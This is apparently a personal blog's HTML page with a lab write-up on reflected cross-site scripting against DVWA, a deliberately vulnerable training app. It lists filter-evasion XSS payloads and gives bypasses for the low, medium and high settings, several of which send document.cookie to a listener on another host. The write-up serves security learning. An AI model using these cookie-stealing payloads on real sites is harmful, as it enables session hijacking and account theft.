@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  
+
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="shortcut icon" type="image/png" href="http://192.168.1.130:1313/favicon.ico" />
+<meta property="og:url" content="http://192.168.1.130:1313/lab/xss-reflected/">
+  <meta property="og:site_name" content="Rich told me to blog">
+  <meta property="og:title" content="Reflected XSS">
+  <meta property="og:description" content="Reflected XSS is an injection attack where malicious scripts are sent to a vulnerable web server (often via URLs), and the server immediately includes (reflects) those scripts unsanitized in the HTML response back to the victim’s browser, which then executes them. It relies on the server reflecting user input directly into the response page.
+Examples:
+javascript:/*--&gt;&lt;/title&gt;&lt;/style&gt;&lt;/textarea&gt;&lt;/script&gt;&lt;/xmp&gt; &lt;svg/onload=&#39;&#43;/&#34;`/&#43;/onmouseover=1/&#43;/[*/[]/&#43;alert(42);//&#39;&gt; &lt;IMG &#34;&#34;&#34;&gt;&lt;SCRIPT&gt;alert(&#34;XSS&#34;)&lt;/SCRIPT&gt;&#34;\&gt; &lt;a href=&#34;javascript:alert(String.fromCharCode(88,83,83))&#34;&gt;Click Me!&lt;/a&gt; &lt;IMG SRC=# onmouseover=&#34;alert(&#39;xxs&#39;)&#34;&gt; &lt;IMG SRC=/ onerror=&#34;alert(String.fromCharCode(88,83,83))&#34;&gt;&lt;/img&gt; DVWA has 3 settings to show different levels of security. Below are the bypasses for each level.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="lab">
+    <meta property="article:published_time" content="2024-12-24T16:06:04+01:00">
+    <meta property="article:modified_time" content="2024-12-24T16:06:04+01:00">
+    <meta property="article:tag" content="DVWA">
+    <meta property="article:tag" content="Firefox">
+    <meta property="article:tag" content="Proxy">
+    <meta property="article:tag" content="Security">
+
+<title>Rich told me to blog | Reflected XSS</title>
+
+    <link rel="stylesheet" href="/css/main.css">
+  
+      <link rel="stylesheet" href="/css/palette/catpuccin.css">
+
+      <script src="/js/main.js"></script>
+
+<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">
+
+</head>
+
+  
+<body
+    class="dark"
+>
+  
+  <main>
+    
+  <div class="container pt-5">
+    <div class="row mt-5 pt-5">
+      
+  <nav aria-label="breadcrumb" class="small">
+    <ol class="breadcrumb fw-bold">
+    <li class="breadcrumb-item">
+      <a href="/"
+        
+      >home</a>
+      
+    </li>
+    <li class="breadcrumb-item">
+      <a href="/lab"
+        class="text-decoration-underline link-offset-3"
+        
+      >lab</a>
+      
+    </li>
+    <li class="breadcrumb-item">
+      <a href="/dvwa"
+        
+      >dvwa</a>
+      
+    </li>
+    <li class="breadcrumb-item">
+      <a href="https://github.com/Nautilloid"
+        
+          target="_blank" rel="noopener noreferrer"
+        
+      >github</a>
+      
+    </li>
+    <li class="breadcrumb-item">
+      <a href="/"
+        
+      >about</a>
+      
+    </li>
+    </ol>
+  </nav>
+
+    </div>
+    
+    <div class="post">
+      <header class="mb-4">
+        <h1 class="text-uppercase">Reflected XSS</h1>
+        
+        
+        <div aria-label="breadcrumb">
+          <ol class="breadcrumb">
+            <li class="breadcrumb-item small">
+              <time datetime="2024-12-24T16:06:04&#43;01:00">December 24, 2024</time>
+            </li>
+            <li class="breadcrumb-item small">
+              1 minutes
+            </li>
+          </ol>
+        </div>
+      </header>
+      <article>
+        <p>Reflected XSS is an injection attack where malicious scripts are sent to a vulnerable web server (often via URLs), and the server immediately includes (reflects) those scripts unsanitized in the HTML response back to the victim&rsquo;s browser, which then executes them. It relies on the server reflecting user input directly into the response page.</p>
+<p>Examples:</p>
+<pre tabindex="0"><code>javascript:/*--&gt;&lt;/title&gt;&lt;/style&gt;&lt;/textarea&gt;&lt;/script&gt;&lt;/xmp&gt;
+&lt;svg/onload=&#39;+/&#34;`/+/onmouseover=1/+/[*/[]/+alert(42);//&#39;&gt;
+</code></pre><pre tabindex="0"><code>&lt;IMG &#34;&#34;&#34;&gt;&lt;SCRIPT&gt;alert(&#34;XSS&#34;)&lt;/SCRIPT&gt;&#34;\&gt;
+</code></pre><pre tabindex="0"><code>&lt;a href=&#34;javascript:alert(String.fromCharCode(88,83,83))&#34;&gt;Click Me!&lt;/a&gt;
+</code></pre><pre tabindex="0"><code>&lt;IMG SRC=# onmouseover=&#34;alert(&#39;xxs&#39;)&#34;&gt;
+</code></pre><pre tabindex="0"><code>&lt;IMG SRC=/ onerror=&#34;alert(String.fromCharCode(88,83,83))&#34;&gt;&lt;/img&gt;
+</code></pre><p>DVWA has 3 settings to show different levels of security. Below are the bypasses for each level.</p>
+<p>Low:</p>
+<pre tabindex="0"><code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+</code></pre><p><img src="1.png" alt="1"></p>
+<pre tabindex="0"><code>192.168.10.123/dvwa/vulnerabilities/xss_r/?name=&lt;script&gt;window.location=&#39;http://192.168.10.123:1337/?cookie=&#39; + document.cookie&lt;/script&gt;
+</code></pre><p><img src="2.png" alt="2"></p>
+<p>Medium:</p>
+<p>The developer has tried to add a simple pattern matching to remove any references to &ldquo;script, to disable any JavaScript.</p>
+<pre tabindex="0"><code>&lt;IMG SRC=# onmouseover=&#34;alert(document.cookie&#34;&gt;
+</code></pre><p><img src="3.png" alt="3"></p>
+<pre tabindex="0"><code>&lt;sc&lt;script&gt;ript&gt;window.location=&#39;http://192.168.10.123:1337/?cookie=&#39; + document.cookie&lt;/script&gt;
+</code></pre><p><img src="4.png" alt="4"></p>
+<p>High:</p>
+<pre tabindex="0"><code>&lt;IMG SRC=# onmouseover=window.location=&#39;http://192.168.10.123:1337/?cookie=&#39; + document.cookie&gt; 
+</code></pre><p>This didn&rsquo;t show cookie.</p>
+<p><img src="5.png" alt="5"></p>
+<p>References:</p>
+<p><a href="https://owasp.org/www-community/attacks/xss/">https://owasp.org/www-community/attacks/xss/</a></p>
+<p><a href="https://owasp.org/www-community/xss-filter-evasion-cheatsheet">https://owasp.org/www-community/xss-filter-evasion-cheatsheet</a></p>
+<p><a href="https://en.wikipedia.org/wiki/Cross-site_scripting">https://en.wikipedia.org/wiki/Cross-site_scripting</a></p>
+<p><a href="https://www.cgisecurity.com/xss-faq.html">https://www.cgisecurity.com/xss-faq.html</a></p>
+<p><a href="https://www.scriptalert1.com/">https://www.scriptalert1.com/</a></p>
+<p><a href="https://portswigger.net/web-security/cross-site-scripting/reflected">https://portswigger.net/web-security/cross-site-scripting/reflected</a></p>
+
+      </article>
+      
+  <div class="tags pb-4 pt-2">
+    
+    
+        <a class="badge rounded-pill text-uppercase text-bg-secondary" href="/tags/dvwa/">DVWA</a>
+        <a class="badge rounded-pill text-uppercase text-bg-secondary" href="/tags/firefox/">Firefox</a>
+        <a class="badge rounded-pill text-uppercase text-bg-secondary" href="/tags/proxy/">Proxy</a>
+        <a class="badge rounded-pill text-uppercase text-bg-secondary" href="/tags/security/">Security</a>
+  </div>
+
+      <div class="row">
+    <div class="col-md">
+        
+        <a href="http://192.168.1.130:1313/lab/local-file-inclusion/">
+            <span>previous: </span>
+            <span>Local File Inclusion</span>
+        </a>
+        
+    </div>
+    <div class="col-md text-md-end">
+        
+        <a href="http://192.168.1.130:1313/lab/file-upload-vulnerabilities/">
+            <span>next: </span>
+            <span>File Upload Vulnerabilities</span>
+        </a>
+        
+    </div>
+</div>
+    </div>
+  </div>
+  <footer>
+    <div class="container mt-4 pb-1">
+    <p class="small opacity-75">
+        take what you need © 2025
+        
+        // powered by <a href="https://gohugo.io/">hugo</a> and <a href="https://github.com/imgios/not-much">imgios/not-much</a>
+        
+    </p>
+</div>
+
+  </footer>
+
+  </main>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-YvpcrYf0tY3lHB60NNkmXc5s9fDVZLESaAA55NDzOxhy9GkcIdslK1eN7N6jIeHz" crossorigin="anonymous"></script>
+</body>
+</html>
